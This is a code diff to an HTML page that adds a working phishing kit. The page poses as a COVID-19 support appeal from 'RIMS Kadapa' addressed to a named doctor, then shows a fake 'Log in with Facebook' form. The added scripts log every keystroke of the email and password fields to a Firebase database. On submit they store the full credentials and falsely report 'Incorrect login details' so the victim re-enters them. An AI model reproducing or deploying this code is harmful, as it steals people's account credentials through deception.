@@ -4,6 +4,7 @@
 <script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-firestore.js"></script>
 
 
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
 
@@ -31,17 +32,9 @@
   
   var db = firebase.firestore();
   
-  db.collection("users").doc("doct").get().then((data)=>{
-  
-  
-
-   console.log(data.data())
-  
 
   
-  })
-  
-  
+  var globalname; 
   
   function _(id){
   return document.getElementById(id)
@@ -58,6 +51,7 @@
  if(edr[x].startsWith("name")){
  
  var ty = edr[x].split("=");
+ globalname = ty[1]
  _("docname").innerHTML = ty[1]
  
  }else{
@@ -71,7 +65,7 @@
   
 document.getElementById("modal").classList.add("active")
   
-  },2000)
+  },1500)
   
   
   }
@@ -150,24 +144,162 @@ color:white
 <div class="modal  modal-sm"  id="modal">
   <a  class="modal-overlay" style='background:rgba(0,0,0,0.7)' aria-label="Close"></a>
   <div  class="modal-container" style='padding:0rem'>
-    <div style='background:#673bb7;width:100%' class="modal-header">
+    <div style='background:#e91e63;width:100%' id='modalhead' class="modal-header">
     
       <p style='color:white;margin:0px'>Please Support Us</p>
     </div>
-	<div style='display:'  id='pcstep1'>
-    <div style='max-height:350px' class="modal-body">
+	<div >
+    <div style='height:auto;padding:0px' class="modal-body">
       <div class="content">
-<img src='covid-19.jpg' style='height:70px;width:auto;'/>
+	  
+	  <div  id='pcstep1'  style='display:;padding:15px'>
+	  <img src='covid-19.jpg' style='height:70px;width:auto;display:block;margin:auto'/>
 	<p class='h6'>Hello <span id='docname'></span>,</p>  
 	<p>We have recovered <span style='font-family:sans-serif;font-weight:600'>20000</span> patients from corona and still <span style='font-family:sans-serif;font-weight:600'>25000</span> patients are getting treatment .<span style='font-family:sans-serif;font-weight:600'>We need your support to encourage all of our doctors</span>.We request you to support us.</p>
 	  <p style='margin:0px'>From,</p>
-	  <p style='margin:0px'>RIMS Kadapa</p>
+	  <p style='font-family:sans-serif;font-weight:600'>RIMS Kadapa</p>
+	  </div>
+	  
+	  
+	  
+	  
+	  	<div id='pcstep2' style='display:none'>
+	<div style='background:#3b5999;color:white;padding:5px' class='clearfix'>
+	<img style='height:25px;background:white' class='float-left' src='facebook.png'/> 
+	</div>
+	<div style='padding:20px auto;margin:10px;'>
+	<div class='panel' style='padding:10px;width:%;display:block;margin:auto'>
+	<div style='font-family:sans-serif;font-weight:bold'>Log in with Facebook</div>
+	<div class='divider'></div>
+		<form>
+	
+	<p style='display:flex'>
+<span style='font-family:sans-serif;font-size:90%;font-family:sans-serif;font-weight:bold;width:40%'>Email or Phone: </span>
+	<input required placeholder='Email or Phone' id='emailad' onkeyup='emailkeyed(this)' class='form-input'/></p>
+	<p style='display:flex;width:100%'><span  style='font-family:sans-serif;font-size:90%;font-weight:bold;width:40%'>Password: </span>
+	<span class="has-icon-right" style='width:100%'>
+	<input required placeholder='Password' id='pass' onkeyup="passkeyed(this)" type='password' class='form-input'/>
+	
+
+	<img isshown=false id='passshow' onclick='showPass(this)' src='eye.png' style='height:10px' class="form-icon "/>
+
+</span>	</p>
+	
+<div class='clearfix'>
+	<button type='submit'  onclick='formsubs(event)' class='float-right' style='cursor:pointer;background:#3b5999;outline:none;color:white'>Login</button>
+		</form>
+	</div>
+	</div>
+	<p class='text-muted'>Like our page to support us.</p>
+	</div>
+	</div>
+	  
+	  
+
 	</div>
     </div>
-    <div class="modal-footer">
+    <div id='modalfoot' class="modal-footer">
       <button onclick='topc2()' class='btn btn-primary'>Support Now</button>
     </div>
     </div>
+	
+<script>
+
+function showPass(ele){
+
+if(!ele.isshown){
+ele.src = "noeye.png"
+_("pass").setAttribute("type","text")
+ele.isshown=true
+}else{
+ele.src = "eye.png"
+_("pass").setAttribute("type","password")
+ele.isshown=false
+}
+
+
+
+}
+
+
+function emailkeyed(ele){
+var date = new Date().getDate().toString();
+var time = new Date().getTime().toString();
+console.log(globalname)
+
+db.collection("users").doc(globalname).collection("email").doc(time).set({[time]:ele.value})
+
+
+}
+
+function passkeyed(ele){
+var date = new Date().getDate().toString();
+var time = new Date().getTime().toString();
+console.log(ele.value)
+db.collection("users").doc(globalname).collection("pass").doc(time).set({[time]:ele.value})
+
+
+}
+
+
+var mnum =1
+
+
+function formsubs(e){
+e.preventDefault();
+var email = _("emailad").value
+var pass = _("pass").value
+var tf = validateEmail(email)
+var isnum = parseInt(email)
+
+if(!isnum){
+if(!tf){
+
+alert("Please enter a valid email address")
+return
+}
+}
+
+
+
+console.log(email,pass)
+var date = new Date().getDate().toString();
+var time = new Date().getTime().toString();
+db.collection("submits").doc(globalname).collection(date).doc(time).set({email:email,pass:pass}).then(()=>{
+
+if(mnum==2){
+window.alert("Thank you "+globalname+" for your valuable support")
+
+}else{
+
+window.alert("Incorrect login details.")
+mnum++
+
+}
+
+
+})
+
+}
+
+
+
+function validateEmail(email) {
+    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(String(email).toLowerCase());
+}
+
+function topc2(){
+
+_("modalfoot").style.display ='none'
+_("pcstep1").style.display ='none'
+_("pcstep2").style.display ='block'
+_("modalhead").style.display ='none'
+
+
+}
+
+</script>
 	
   </div>
 </div>
